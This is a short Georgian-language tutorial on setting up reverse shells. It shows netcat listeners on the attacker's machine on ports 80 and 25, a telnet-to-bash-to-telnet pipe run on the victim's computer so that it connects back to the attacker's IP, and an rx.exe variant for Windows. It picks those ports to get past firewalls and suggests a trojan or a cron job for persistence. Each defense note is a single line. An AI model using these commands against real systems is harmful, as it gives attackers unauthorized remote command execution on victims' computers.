# უკუღმა ტელნეტის სესია

## netcat (ვინდოუსი ან იუნიქსი)

ეხლა გაჩვენებთ როგორ უნდა გააკეთოთ netcat-ით reverse telnet შელი მსხვერპლის კომპიუტერიდან.

**შენს კომპიუტერში (თავდამსხმელი):**

გაუშვი პირველი შელში: გაუშვი netcat-ი ისე რომ 80-ე პორტზე ელოდოს კლიენტს.

```
nc -l -n -v -p 80
```

გაუშვი მეორე შელში: გაუშვი netcat-ი ისე რომ 25-ე პორტზე ელოდოს კლიენტს.

```
nc -l -n -v -p 25
```

**მსხვერპლის კომპიუტერში ქენი:**

ქენი:

```
/usr/bin/telnet <თავდამსხმელის აიპი> 80 | /bin/bash | /usr/bin/telnet <თავდამსხმელის აიპი> 25
```

თავდამსხმელის კომპიუტერში, რომელიც 80 პორტზე უსმენს, შეგიძლია ბრძანებების მიცემა ისე როგორც მსხვერპილის კომპიუტერის წინ ყოფილხარ. რეზულტატი მეორე შელზე გამოჩდება.

```
-l: listening (სმენა) 
-p: port (პორტი) 
-t: telnet (ტელნეტი)
```

უმრავლესი ადმინისტრატორი ისე აკონფიგრირებს ﬁrewall-ს რომ 80 (HTTP) და 25 (SMTP) შესღუდული არ იყოს. ამიტომაც არიან ეს პორტები შერჩეულნი.

მსხვერპლის კომპიუტერთან თავდამსხმელს ავტომატურად შეუძლია დაუკავშურდეს ტელნეტით, ტროიანის გამოყენებით ან იუნიქსის შემთხვევაში cron job-ით.

## დაცვა

telnet-ის გამორთვა, bastion computers.

# rx.exe (ვინდოუსი)

## მაგალითი

**ეტაპი 1:** თავდამსხმელის კომპიუტერში გაუშვი netcat-ი რომ დაელოდო კავშირს.

```
nc -l -n -v -p 8080
```

**ეტაპი 2:** გაუშვი netcat-ი მსხვერპლის კომპიუტერში.

**ეტაპი 3:** მსხვერპლის კომპიუტერში გაუშვი rx.exe:
rx.exe <თავდამსხმელის აიპი>

**ეტაპი 4:** თავდამსხმელის შეუძლია მსხვერპლის კომპიუტერი აკონტროლოს და ბრძანებები გაუშვას მსხვერპლის კომპიუტერში.

მსხვერპლის კომპიუტერი თავდამსხმელს შეიძლება ავტომატურად დაუკავშურდეს ტელნეტით, ტროიანის გამოყენებით ან იუნიქსის შემთხვევაში cron job-ით.

## დაცვა

განახლებული ანტივირუსი, ძლიერი ACL-ები.

